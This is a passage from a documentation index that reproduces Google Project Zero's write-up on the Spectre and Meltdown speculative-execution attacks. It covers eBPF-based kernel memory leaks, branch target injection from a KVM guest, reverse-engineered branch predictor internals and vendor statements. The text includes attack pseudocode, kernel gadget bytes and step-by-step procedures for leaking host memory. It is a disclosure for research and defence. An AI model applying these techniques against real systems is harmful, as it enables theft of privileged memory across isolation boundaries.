explanation"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#attacking-the-kernel","text":"This section describes in more detail how variant 1 can be used to leak Linux kernel memory using the eBPF bytecode interpreter and JIT engine. While there are many interesting potential targets for variant 1 attacks, we chose to attack the Linux in-kernel eBPF JIT/interpreter because it provides more control to the attacker than most other JITs. The Linux kernel supports eBPF since version 3.18. Unprivileged userspace code can supply bytecode to the kernel that is verified by the kernel and then: either interpreted by an in-kernel bytecode interpreter or translated to native machine code that also runs in kernel context using a JIT engine (which translates individual bytecode instructions without performing any further optimizations) Execution of the bytecode can be triggered by attaching the eBPF bytecode to a socket as a filter and then sending data through the other end of the socket. Whether the JIT engine is enabled depends on a run-time configuration setting - but at least on the tested Intel processor, the attack works independent of that setting. Unlike classic BPF, eBPF has data types like data arrays and function pointer arrays into which eBPF bytecode can index. Therefore, it is possible to create the code pattern described above in the kernel using eBPF bytecode. eBPF's data arrays are less efficient than its function pointer arrays, so the attack will use the latter where possible. Both machines on which this was tested have no SMAP, and the PoC relies on that (but it shouldn't be a precondition in principle). Additionally, at least on the Intel machine on which this was tested, bouncing modified cache lines between cores is slow, apparently because the MESI protocol is used for cache coherence [8]. Changing the reference counter of an eBPF array on one physical CPU core causes the cache line containing the reference counter to be bounced over to that CPU core, making reads of the reference counter on all other CPU cores slow until the changed reference counter has been written back to memory. Because the length and the reference counter of an eBPF array are stored in the same cache line, this also means that changing the reference counter on one physical CPU core causes reads of the eBPF array's length to be slow on other physical CPU cores (intentional false sharing). The attack uses two eBPF programs. The first one tail-calls through a page-aligned eBPF function pointer array prog_map at a configurable index. In simplified terms, this program is used to determine the address of prog_map by guessing the offset from prog_map to a userspace address and tail-calling through prog_map at the guessed offsets. To cause the branch prediction to predict that the offset is below the length of prog_map, tail calls to an in-bounds index are performed in between. To increase the mis-speculation window, the cache line containing the length of prog_map is bounced to another core. To test whether an offset guess was successful, it can be tested whether the userspace address has been loaded into the cache. Because such straightforward brute-force guessing of the address would be slow, the following optimization is used: 215 adjacent userspace memory mappings [9], each consisting of 24 pages, are created at the userspace address user_mapping_area, covering a total area of 231 bytes. Each mapping maps the same physical pages, and all mappings are present in the pagetables. This permits the attack to be carried out in steps of 231 bytes. For each step, after causing an out-of-bounds access through prog_map, only one cache line each from the first 24 pages of user_mapping_area have to be tested for cached memory. Because the L3 cache is physically indexed, any access to a virtual address mapping a physical page will cause all other virtual addresses mapping the same physical page to become cached as well. When this attack finds a hit\u2014a cached memory location\u2014the upper 33 bits of the kernel address are known (because they can be derived from the address guess at which the hit occurred), and the low 16 bits of the address are also known (from the offset inside user_mapping_area at which the hit was found). The remaining part of the address of user_mapping_area is the middle. The remaining bits in the middle can be determined by bisecting the remaining address space: Map two physical pages to adjacent ranges of virtual addresses, each virtual address range the size of half of the remaining search space, then determine the remaining address bit-wise. At this point, a second eBPF program can be used to actually leak data. In pseudocode, this program looks as follows: uint64_t bitmask = ; uint64_t bitshift_selector = ; uint64_t prog_array_base_offset = ; uint64_t secret_data_offset = ; // index will be bounds-checked by the runtime, // but the bounds check will be bypassed speculatively uint64_t secret_data = bpf_map_read(array=victim_array, index=secret_data_offset); // select a single bit, move it to a specific position, and add the base offset uint64_t progmap_index = (((secret_data & bitmask) >> bitshift_selector) << 7) + prog_array_base_offset; bpf_tail_call(prog_map, progmap_index); This program reads 8-byte-aligned 64-bit values from an eBPF data array \"victim_map\" at a runtime-configurable offset and bitmasks and bit-shifts the value so that one bit is mapped to one of two values that are 27 bytes apart (sufficient to not land in the same or adjacent cache lines when used as an array index). Finally it adds a 64-bit offset, then uses the resulting value as an offset into prog_map for a tail call. This program can then be used to leak memory by repeatedly calling the eBPF program with an out-of-bounds offset into victim_map that specifies the data to leak and an out-of-bounds offset into prog_map that causes prog_map + offset to point to a userspace memory area. Misleading the branch prediction and bouncing the cache lines works the same way as for the first eBPF program, except that now, the cache line holding the length of victim_map must also be bounced to another core.","title":"Attacking the kernel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-2-branch-target-injection","text":"This section describes the theory behind our PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific version of Debian's distro kernel running on the host, can read host kernel memory at a rate of around 1500 bytes/second.","title":"Variant 2: Branch target injection"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#basics","text":"Prior research (see the Literature section at the end) has shown that it is possible for code in separate security contexts to influence each other's branch prediction. So far, this has only been used to infer information about where code is located (in other words, to create interference from the victim to the attacker); however, the basic hypothesis of this attack variant is that it can also be used to redirect execution of code in the victim context (in other words, to create interference from the attacker to the victim; the other way around). The basic idea for the attack is to target victim code that contains an indirect branch whose target address is loaded from memory and flush the cache line containing the target address out to main memory. Then, when the CPU reaches the indirect branch, it won't know the true destination of the jump, and it won't be able to calculate the true destination until it has finished loading the cache line back into the CPU, which takes a few hundred cycles. Therefore, there is a time window of typically over 100 cycles in which the CPU will speculatively execute instructions based on branch prediction.","title":"Basics"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#haswell-branch-prediction-internals","text":"Some of the internals of the branch prediction implemented by Intel's processors have already been published; however, getting this attack to work properly required significant further experimentation to determine additional details. This section focuses on the branch prediction internals that were experimentally derived from the Intel Haswell Xeon CPU. Haswell seems to have multiple branch prediction mechanisms that work very differently: A generic branch predictor that can only store one target per source address; used for all kinds of jumps, like absolute jumps, relative jumps and so on. A specialized indirect call predictor that can store multiple targets per source address; used for indirect calls. (There is also a specialized return predictor, according to Intel's optimization manual, but we haven't analyzed that in detail yet. If this predictor could be used to reliably dump out some of the call stack through which a VM was entered, that would be very interesting.)","title":"Haswell branch prediction internals"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_1","text":"Generic predictor The generic branch predictor, as documented in prior research, only uses the lower 31 bits of the address of the last byte of the source instruction for its prediction. If, for example, a branch target buffer (BTB) entry exists for a jump from 0x4141.0004.1000 to 0x4141.0004.5123, the generic predictor will also use it to predict a jump from 0x4242.0004.1000. When the higher bits of the source address differ like this, the higher bits of the predicted destination change together with it\u2014in this case, the predicted destination address will be 0x4242.0004.5123\u2014so apparently this predictor doesn't store the full, absolute destination address. Before the lower 31 bits of the source address are used to look up a BTB entry, they are folded together using XOR. Specifically, the following bits are folded together: | bit A | bit B | | 0x40.0000 | 0x2000 | | 0x80.0000 | 0x4000 | | 0x100.0000 | 0x8000 | | 0x200.0000 | 0x1.0000 | | 0x400.0000 | 0x2.0000 | | 0x800.0000 | 0x4.0000 | | 0x2000.0000 | 0x10.0000 | | 0x4000.0000 | 0x20.0000 | In other words, if a source address is XORed with both numbers in a row of this table, the branch predictor will not be able to distinguish the resulting address from the original source address when performing a lookup. For example, the branch predictor is able to distinguish source addresses 0x100.0000 and 0x180.0000, and it can also distinguish source addresses 0x100.0000 and 0x180.8000, but it can't distinguish source addresses 0x100.0000 and 0x140.2000 or source addresses 0x100.0000 and 0x180.4000. In the following, this will be referred to as aliased source addresses. When an aliased source address is used, the branch predictor will still predict the same target as for the unaliased source address. This indicates that the branch predictor stores a truncated absolute destination address, but that hasn't been verified. Based on observed maximum forward and backward jump distances for different source addresses, the low 32-bit half of the target address could be stored as an absolute 32-bit value with an additional bit that specifies whether the jump from source to target crosses a 232 boundary; if the jump crosses such a boundary, bit 31 of the source address determines whether the high half of the instruction pointer should increment or decrement.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_2","text":"Indirect call predictor The inputs of the BTB lookup for this mechanism seem to be: The low 12 bits of the address of the source instruction (we are not sure whether it's the address of the first or the last byte) or a subset of them. The branch history buffer state. If the indirect call predictor can't resolve a branch, it is resolved by the generic predictor instead. Intel's optimization manual hints at this behavior: \"Indirect Calls and Jumps. These may either be predicted as having a monotonic target or as having targets that vary in accordance with recent program behavior.\" The branch history buffer (BHB) stores information about the last 29 taken branches - basically a fingerprint of recent control flow - and is used to allow better prediction of indirect calls that can have multiple targets. The update function of the BHB works as follows (in pseudocode; src is the address of the last byte of the source instruction, dst is the destination address): void bhb_update(uint58_t *bhb_state, unsigned long src, unsigned long dst) { *bhb_state <<= 2; *bhb_state ^= (dst & 0x3f); *bhb_state ^= (src & 0xc0) >> 6; *bhb_state ^= (src & 0xc00) >> (10 - 2); *bhb_state ^= (src & 0xc000) >> (14 - 4); *bhb_state ^= (src & 0x30) << (6 - 4); *bhb_state ^= (src & 0x300) << (8 - 8); *bhb_state ^= (src & 0x3000) >> (12 - 10); *bhb_state ^= (src & 0x30000) >> (16 - 12); *bhb_state ^= (src & 0xc0000) >> (18 - 14); } Some of the bits of the BHB state seem to be folded together further using XOR when used for a BTB access, but the precise folding function hasn't been understood yet. The BHB is interesting for two reasons. First, knowledge about its approximate behavior is required in order to be able to accurately cause collisions in the indirect call predictor. But it also permits dumping out the BHB state at any repeatable program state at which the attacker can execute code - for example, when attacking a hypervisor, directly after a hypercall. The dumped BHB state can then be used to fingerprint the hypervisor or, if the attacker has access to the hypervisor binary, to determine the low 20 bits of the hypervisor load address (in the case of KVM: the low 20 bits of the load address of kvm-intel.ko).","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_3","text":"Reverse-Engineering Branch Predictor Internals This subsection describes how we reverse-engineered the internals of the Haswell branch predictor. Some of this is written down from memory, since we didn't keep a detailed record of what we were doing. We initially attempted to perform BTB injections into the kernel using the generic predictor, using the knowledge from prior research that the generic predictor only looks at the lower half of the source address and that only a partial target address is stored. This kind of worked - however, the injection success rate was very low, below 1%. (This is the method we used in our preliminary PoCs for method 2 against modified hypervisors running on Haswell.) We decided to write a userspace test case to be able to more easily test branch predictor behavior in different situations. Based on the assumption that branch predictor state is shared between hyperthreads [10], we wrote a program of which two instances are each pinned to one of the two logical processors running on a specific physical core, where one instance attempts to perform branch injections while the other measures how often branch injections are successful. Both instances were executed with ASLR disabled and had the same code at the same addresses. The injecting process performed indirect calls to a function that accesses a (per-process) test variable; the measuring process performed indirect calls to a function that tests, based on timing, whether the per-process test variable is cached, and then evicts it using CLFLUSH. Both indirect calls were performed through the same callsite. Before each indirect call, the function pointer stored in memory was flushed out to main memory using CLFLUSH to widen the speculation time window. Additionally, because of the reference to \"recent program behavior\" in Intel's optimization manual, a bunch of conditional branches that are always taken were inserted in front of the indirect call. In this test, the injection success rate was above 99%, giving us a base setup for future experiments. We then tried to figure out the details of the prediction scheme. We assumed that the prediction scheme uses a global branch history buffer of some kind. To determine the duration for which branch information stays in the history buffer, a conditional branch that is only taken in one of the two program instances was inserted in front of the series of always-taken conditional jumps, then the number of always-taken conditional jumps (N) was varied. The result was that for N=25, the processor was able to distinguish the branches (misprediction rate under 1%), but for N=26, it failed to do so (misprediction rate over 99%). Therefore, the branch history buffer had to be able to store information about at least the last 26 branches. The code in one of the two program instances was then moved around in memory. This revealed that only the lower 20 bits of the source and target addresses have an influence on the branch history buffer. Testing with different types of branches in the two program instances revealed that static jumps, taken conditional jumps, calls and returns influence the branch history buffer the same way; non-taken conditional jumps don't influence it; the address of the last byte of the source instruction is the one that counts; IRETQ doesn't influence the history buffer state (which is useful for testing because it permits creating program flow that is invisible to the history buffer). Moving the last conditional branch before the indirect call around in memory multiple times revealed that the branch history buffer contents can be used to distinguish many different locations of that last conditional branch instruction. This suggests that the history buffer doesn't store a list of small history values; instead, it seems to be a larger buffer in which history data is mixed together. However, a history buffer needs to \"forget\" about past branches after a certain number of new branches have been taken in order to be useful for branch prediction. Therefore, when new data is mixed into the history buffer, this can not cause information in bits that are already present in the history buffer to propagate downwards - and given that, upwards combination of information probably wouldn't be very useful either. Given that branch prediction also must be very fast, we concluded that it is likely that the update function of the history buffer left-shifts the old history buffer, then XORs in the new state (see diagram). If this assumption is correct, then the history buffer contains a lot of information about the most recent branches, but only contains as many bits of information as are shifted per history buffer update about the last branch about which it contains any data. Therefore, we tested whether flipping different bits in the source and target addresses of a jump followed by 32 always-taken jumps with static source and target allows the branch prediction to disambiguate an indirect call. [11] With 32 static jumps in between, no bit flips seemed to have an influence, so we decreased the number of static jumps until a difference was observable. The result with 28 always-taken jumps in between was that bits 0x1 and 0x2 of the target and bits 0x40 and 0x80 of the source had such an influence; but flipping both 0x1 in the target and 0x40 in the source or 0x2 in the target and 0x80 in the source did not permit disambiguation. This shows that the per-insertion shift of the history buffer is 2 bits and shows which data is stored in the least significant bits of the history buffer. We then repeated this with decreased amounts of fixed jumps after the bit-flipped jump to determine which information is stored in the remaining bits.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#reading-host-memory-from-a-kvm-guest","text":"","title":"Reading host memory from a KVM guest"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_4","text":"Locating the host kernel Our PoC locates the host kernel in several steps. The information that is determined and necessary for the next steps of the attack consists of: lower 20 bits of the address of kvm-intel.ko full address of kvm.ko full address of vmlinux Looking back, this is unnecessarily complicated, but it nicely demonstrates the various techniques an attacker can use. A simpler way would be to first determine the address of vmlinux, then bisect the addresses of kvm.ko and kvm-intel.ko. In the first step, the address of kvm-intel.ko is leaked. For this purpose, the branch history buffer state after guest entry is dumped out. Then, for every possible value of bits 12..19 of the load address of kvm-intel.ko, the expected lowest 16 bits of the history buffer are computed based on the load address guess and the known offsets of the last 8 branches before guest entry, and the results are compared against the lowest 16 bits of the leaked history buffer state. The branch history buffer state is leaked in steps of 2 bits by measuring misprediction rates of an indirect call with two targets. One way the indirect call is reached is from a vmcall instruction followed by a series of N branches whose relevant source and target address bits are all zeroes. The second way the indirect call is reached is from a series of controlled branches in userspace that can be used to write arbitrary values into the branch history buffer. Misprediction rates are measured as in the section \"Reverse-Engineering Branch Predictor Internals\", using one call target that loads a cache line and another one that checks whether the same cache line has been loaded. With N=29, mispredictions will occur at a high rate if the controlled branch history buffer value is zero because all history buffer state from the hypercall has been erased. With N=28, mispredictions will occur if the controlled branch history buffer value is one of 0<<(28 2), 1<<(28 2), 2<<(28 2), 3<<(28 2) - by testing all four possibilities, it can be detected which one is right. Then, for decreasing values of N, the four possibilities are {0|1|2|3}<<(28*2) | (history_buffer_for(N+1) >> 2). By repeating this for decreasing values for N, the branch history buffer value for N=0 can be determined. At this point, the low 20 bits of kvm-intel.ko are known; the next step is to roughly locate kvm.ko. For this, the generic branch predictor is used, using data inserted into the BTB by an indirect call from kvm.ko to kvm-intel.ko that happens on every hypercall; this means that the source address of the indirect call has to be leaked out of the BTB. kvm.ko will probably be located somewhere in the range from 0xffffffffc0000000 to 0xffffffffc4000000, with page alignment (0x1000). This means that the first four entries in the table in the section \"Generic Predictor\" apply; there will be 24-1=15 aliasing addresses for the correct one. But that is also an advantage: It cuts down the search space from 0x4000 to 0x4000/24=1024. To find the right address for the source or one of its aliasing addresses, code that loads data through a specific register is placed at all possible call targets (the leaked low 20 bits of kvm-intel.ko plus the in-module offset of the call target plus a multiple of 220) and indirect calls are placed at all possible call sources. Then, alternatingly, hypercalls are performed and indirect calls are performed through the different possible non-aliasing call sources, with randomized history buffer state that prevents the specialized prediction from working. After this step, there are 216 remaining possibilities for the load address of kvm.ko. Next, the load address of vmlinux can be determined in a similar way, using an indirect call from vmlinux to kvm.ko. Luckily, none of the bits which are randomized in the load address of vmlinux are folded together, so unlike when locating kvm.ko, the result will directly be unique. vmlinux has an alignment of 2MiB and a randomization range of 1GiB, so there are still only 512 possible addresses. Because (as far as we know) a simple hypercall won't actually cause indirect calls from vmlinux to kvm.ko, we instead use port I/O from the status register of an emulated serial port, which is present in the default configuration of a virtual machine created with virt-manager. The only remaining piece of information is which one of the 16 aliasing load addresses of kvm.ko is actually correct. Because the source address of an indirect call to kvm.ko is known, this can be solved using bisection: Place code at the various possible targets that, depending on which instance of the code is speculatively executed, loads one of two cache lines, and measure which one of the cache lines gets loaded.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_5","text":"Identifying cache sets The PoC assumes that the VM does not have access to hugepages.To discover eviction sets for all L3 cache sets with a specific alignment relative to a 4KiB page boundary, the PoC first allocates 25600 pages of memory. Then, in a loop, it selects random subsets of all remaining unsorted pages such that the expected number of sets for which an eviction set is contained in the subset is 1, reduces each subset down to an eviction set by repeatedly accessing its cache lines and testing whether the cache lines are always cached (in which case they're probably not part of an eviction set) and attempts to use the new eviction set to evict all remaining unsorted cache lines to determine whether they are in the same cache set [12].","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_6","text":"Locating the host-virtual address of a guest page Because this attack uses a FLUSH+RELOAD approach for leaking data, it needs to know the host-kernel-virtual address of one guest page. Alternative approaches such as PRIME+PROBE should work without that requirement. The basic idea for this step of the attack is to use a branch target injection attack against the hypervisor to load an attacker-controlled address and test whether that caused the guest-owned page to be loaded. For this, a gadget that simply loads from the memory location specified by R8 can be used - R8-R11 still contain guest-controlled values when the first indirect call after a guest exit is reached on this kernel build. We expected that an attacker would need to either know which eviction set has to be used at this point or brute-force it simultaneously; however, experimentally, using random eviction sets works, too. Our theory is that the observed behavior is actually the result of L1D and L2 evictions, which might be sufficient to permit a few instructions worth of speculative execution. The host kernel maps (nearly?) all physical memory in the physmap area, including memory assigned to KVM guests. However, the location of the physmap is randomized (with a 1GiB alignment), in an area of size 128PiB. Therefore, directly bruteforcing the host-virtual address of a guest page would take a long time. It is not necessarily impossible; as a ballpark estimate, it should be possible within a day or so, maybe less, assuming 12000 successful injections per second and 30 guest pages that are tested in parallel; but not as impressive as doing it in a few minutes. To optimize this, the problem can be split up: First, brute-force the physical address using a gadget that can load from physical addresses, then brute-force the base address of the physmap region. Because the physical address can usually be assumed to be far below 128PiB, it can be brute-forced more efficiently, and brute-forcing the base address of the physmap region afterwards is also easier because then address guesses with 1GiB alignment can be used. To brute-force the physical address, the following gadget can be used: ffffffff810a9def: 4c 89 c0 mov rax,r8 ffffffff810a9df2: 4d 63 f9 movsxd r15,r9d ffffffff810a9df5: 4e 8b 04 fd c0 b3 a6 mov r8,QWORD PTR [r15*8-0x7e594c40] ffffffff810a9dfc: 81 ffffffff810a9dfd: 4a 8d 3c 00 lea rdi,[rax+r8*1] ffffffff810a9e01: 4d 8b a4 00 f8 00 00 mov r12,QWORD PTR [r8+rax*1+0xf8] ffffffff810a9e08: 00 This gadget permits loading an 8-byte-aligned value from the area around the kernel text section by setting R9 appropriately, which in particular permits loading page_offset_base, the start address of the physmap. Then, the value that was originally in R8 - the physical address guess minus 0xf8 - is added to the result of the previous load, 0xfa is added to it, and the result is dereferenced.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_7","text":"Cache set selection To select the correct L3 eviction set, the attack from the following section is essentially executed with different eviction sets until it works.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_8","text":"Leaking data At this point, it would normally be necessary to locate gadgets in the host kernel code that can be used to actually leak data by reading from an attacker-controlled location, shifting and masking the result appropriately and then using the result of that as offset to an attacker-controlled address for a load. But piecing gadgets together and figuring out which ones work in a speculation context seems annoying. So instead, we decided to use the eBPF interpreter, which is built into the host kernel - while there is no legitimate way to invoke it from inside a VM, the presence of the code in the host kernel's text section is sufficient to make it usable for the attack, just like with ordinary ROP gadgets. The eBPF interpreter entry point has the following function signature: static unsigned int __bpf_prog_run(void ctx, const struct bpf_insn insn) The second parameter is a pointer to an array of statically pre-verified eBPF instructions to be executed - which means that __bpf_prog_run() will not perform any type checks or bounds checks. The first parameter is simply stored as part of the initial emulated register state, so its value doesn't matter. The eBPF interpreter provides, among other things: multiple emulated 64-bit registers 64-bit immediate writes to emulated registers memory reads from addresses stored in emulated registers bitwise operations (including bit shifts) and arithmetic operations To call the interpreter entry point, a gadget that gives RSI and RIP control given R8-R11 control and controlled data at a known memory location is necessary. The following gadget provides this functionality: ffffffff81514edd: 4c 89 ce mov rsi,r9 ffffffff81514ee0: 41 ff 90 b0 00 00 00 call QWORD PTR [r8+0xb0] Now, by pointing R8 and R9 at the mapping of a guest-owned page in the physmap, it is possible to speculatively execute arbitrary unvalidated eBPF bytecode in the host kernel. Then, relatively straightforward bytecode can be used to leak data into the cache.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-3-rogue-data-cache-load","text":"Basically, read Anders Fogh's blogpost: https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ In summary, an attack using this variant of the issue attempts to read kernel memory from userspace without misdirecting the control flow of kernel code. This works by using the code pattern that was used for the previous variants, but in userspace. The underlying idea is that the permission check for accessing an address might not be on the critical path for reading data from memory to a register, where the permission check could have significant performance impact. Instead, the memory read could make the result of the read available to following instructions immediately and only perform the permission check asynchronously, setting a flag in the reorder buffer that causes an exception to be raised if the permission check fails. We do have a few additions to make to Anders Fogh's blogpost: \"Imagine the following instruction executed in usermode mov rax,[somekernelmodeaddress] It will cause an interrupt when retired, [...]\" It is also possible to already execute that instruction behind a high-latency mispredicted branch to avoid taking a page fault. This might also widen the speculation window by increasing the delay between the read from a kernel address and delivery of the associated exception. \"First, I call a syscall that touches this memory. Second, I use the prefetcht0 instruction to improve my odds of having the address loaded in L1.\" When we used prefetch instructions after doing a syscall, the attack stopped working for us, and we have no clue why. Perhaps the CPU somehow stores whether access was denied on the last access and prevents the attack from working if that is the case? \"Fortunately I did not get a slow read suggesting that Intel null\u2019s the result when the access is not allowed.\" That (read from kernel address returns all-zeroes) seems to happen for memory that is not sufficiently cached but for which pagetable entries are present, at least after repeated read attempts. For unmapped memory, the kernel address read does not return a result at all.","title":"Variant 3: Rogue data cache load"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#ideas-for-further-research","text":"We believe that our research provides many remaining research topics that we have not yet investigated, and we encourage other public researchers to look into these. This section contains an even higher amount of speculation than the rest of this blogpost - it contains untested ideas that might well be useless.","title":"Ideas for further research"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#leaking-without-data-cache-timing","text":"It would be interesting to explore whether there are microarchitectural attacks other than measuring data cache timing that can be used for exfiltrating data out of speculative execution.","title":"Leaking without data cache timing"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#other-microarchitectures","text":"Our research was relatively Haswell-centric so far. It would be interesting to see details e.g. on how the branch prediction of other modern processors works and how well it can be attacked.","title":"Other microarchitectures"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#other-jit-engines","text":"We developed a successful variant 1 attack against the JIT engine built into the Linux kernel. It would be interesting to see whether attacks against more advanced JIT engines with less control over the system are also practical - in particular, JavaScript engines.","title":"Other JIT engines"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#more-efficient-scanning-for-host-virtual-addresses-and-cache-sets","text":"In variant 2, while scanning for the host-virtual address of a guest-owned page, it might make sense to attempt to determine its L3 cache set first. This could be done by performing L3 evictions using an eviction pattern through the physmap, then testing whether the eviction affected the guest-owned page. The same might work for cache sets - use an L1D+L2 eviction set to evict the function pointer in the host kernel context, use a gadget in the kernel to evict an L3 set using physical addresses, then use that to identify which cache sets guest lines belong to until a guest-owned eviction set has been constructed.","title":"More efficient scanning for host-virtual addresses and cache sets"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#dumping-the-complete-btb-state","text":"Given that the generic BTB seems to only be able to distinguish 231-8 or fewer source addresses, it seems feasible to dump out the complete BTB state generated by e.g. a hypercall in a timeframe around the order of a few hours. (Scan for jump sources, then for every discovered jump source, bisect the jump target.) This could potentially be used to identify the locations of functions in the host kernel even if the host kernel is custom-built. The source address aliasing would reduce the usefulness somewhat, but because target addresses don't suffer from that, it might be possible to correlate (source,target) pairs from machines with different KASLR offsets and reduce the number of candidate addresses based on KASLR being additive while aliasing is bitwise. This could then potentially allow an attacker to make guesses about the host kernel version or the compiler used to build it based on jump offsets or distances between functions.","title":"Dumping the complete BTB state"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-2-leaking-with-more-efficient-gadgets","text":"If sufficiently efficient gadgets are used for variant 2, it might not be necessary to evict host kernel function pointers from the L3 cache at all; it might be sufficient to only evict them from L1D and L2.","title":"Variant 2: Leaking with more efficient gadgets"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#various-speedups","text":"In particular the variant 2 PoC is still a bit slow. This is probably partly because: It only leaks one bit at a time; leaking more bits at a time should be doable. It heavily uses IRETQ for hiding control flow from the processor. It would be interesting to see what data leak rate can be achieved using variant 2.","title":"Various speedups"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#leaking-or-injection-through-the-return-predictor","text":"If the return predictor also doesn't lose its state on a privilege level change, it might be useful for either locating the host kernel from inside a VM (in which case bisection could be used to very quickly discover the full address of the host kernel) or injecting return targets (in particular if the return address is stored in a cache line that can be flushed out by the attacker and isn't reloaded before the return instruction). However, we have not performed any experiments with the return predictor that yielded conclusive results so far.","title":"Leaking or injection through the return predictor"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#leaking-data-out-of-the-indirect-call-predictor","text":"We have attempted to leak target information out of the indirect call predictor, but haven't been able to make it work.","title":"Leaking data out of the indirect call predictor"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#vendor-statements","text":"The following statement were provided to us regarding this issue from the vendors to whom Project Zero disclosed this vulnerability:","title":"Vendor statements"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#intel","text":"Intel is committed to improving the overall security of computer systems. The methods described here rely on common properties of modern microprocessors. Thus, susceptibility to these methods is not limited to Intel processors, nor does it mean that a processor is working outside its intended functional specification. Intel is working closely with our ecosystem partners, as well as with other silicon vendors whose processors are affected, to design and distribute both software and hardware mitigations for these methods. For more information and links to useful resources, visit: https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&languageid=en-fr http://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf","title":"Intel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#amd","text":"AMD provided the following link: http://www.amd.com/en/corporate/speculative-execution","title":"AMD"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#arm","text":"Arm recognises that the speculation functionality of many modern high-performance processors, despite working as intended, can be used in conjunction with the timing of cache operations to leak some information as described in this blog. Correspondingly, Arm has developed software mitigations that we recommend be deployed. Specific details regarding the affected processors and mitigations can be found at this website: https://developer.arm.com/support/security-update Arm has included a detailed technical whitepaper as well as links to information from some of Arm\u2019s architecture partners regarding their specific implementations and mitigations.","title":"ARM"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#literature","text":"Note that some of these documents - in particular Intel's documentation - change over time, so quotes from and references to it may not reflect the latest version of Intel's documentation. https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf : Intel's optimization manual has many interesting pieces of optimization advice that hint at relevant microarchitectural behavior; for example: \"Placing data immediately following an indirect branch can cause a performance problem. If the data consists of all zeros, it looks like a long stream of ADDs to memory destinations and this can cause resource conflicts and slow down branch recovery. Also, data immediately following indirect branches may appear as branches to the branch predication [sic] hardware, which can branch off to execute other data pages. This can lead to subsequent self-modifying code problems.\" \"Loads can:[...]Be carried out speculatively, before preceding branches are resolved.\" \"Software should avoid writing to a code page in the same 1-KByte subpage that is being executed or fetching code in the same 2-KByte subpage of that is being written. In addition, sharing a page containing directly or speculatively executed code with another processor as a data page can trigger an SMC condition that causes the entire pipeline of the machine and the trace cache to be cleared. This is due to the self-modifying code condition.\" \"if mapped as WB or WT, there is a potential for speculative processor reads to bring the data into the caches\" \"Failure to map the region as WC may allow the line to be speculatively read into the processor caches (via the wrong path of a mispredicted branch).\" https://software.intel.com/en-us/articles/intel-sdm : Intel's Software Developer Manuals http://www.agner.org/optimize/microarchitecture.pdf : Agner Fog's documentation of reverse-engineered processor behavior and relevant theory was very helpful for this research. http://www.cs.binghamton.edu/~dima/micro16.pdf and https://github.com/felixwilhelm/mario_baslr : Prior research by Dmitry Evtyushkin, Dmitry Ponomarev and Nael Abu-Ghazaleh on abusing branch target buffer behavior to leak addresses that we used as a starting point for analyzing the branch prediction of Haswell processors. Felix Wilhelm's research based on this provided the basic idea behind variant 2. https://arxiv.org/pdf/1507.06955.pdf : The rowhammer.js research by Daniel Gruss, Cl\u00e9mentine Maurice and Stefan Mangard contains information about L3 cache eviction patterns that we reused in the KVM PoC to evict a function pointer. https://xania.org/201602/bpu-part-one : Matt Godbolt blogged about reverse-engineering the structure of the branch predictor on Intel processors. https://www.sophia.re/thesis.pdf : Sophia D'Antoine wrote a thesis that shows that opcode scheduling can theoretically be used to transmit data between hyperthreads. https://gruss.cc/files/kaiser.pdf : Daniel Gruss, Moritz Lipp, Michael Schwarz, Richard Fellner, Cl\u00e9mentine Maurice, and Stefan Mangard wrote a paper on mitigating microarchitectural issues caused by pagetable sharing between userspace and the kernel. https://www.jilp.org/ : This journal contains many articles on branch prediction. http://blog.stuffedcow.net/2013/01/ivb-cache-replacement/ : This blogpost by Henry Wong investigates the L3 cache replacement policy used by Intel's Ivy Bridge architecture.","title":"Literature"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#references","text":"[1] This initial report did not contain any information about variant 3. We had discussed whether direct reads from kernel memory could work, but thought that it was unlikely. We later tested and reported variant 3 prior to the publication of Anders Fogh's work at https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ . [2] The precise model names are listed in the section \"Tested Processors\". The code for reproducing this is in the writeup_files.tar archive in our bugtracker, in the folders userland_test_x86 and userland_test_aarch64. [3] The attacker-controlled offset used to perform an out-of-bounds access on an array by this PoC is a 32-bit value, limiting the accessible addresses to a 4GiB window in the kernel heap area. [4] 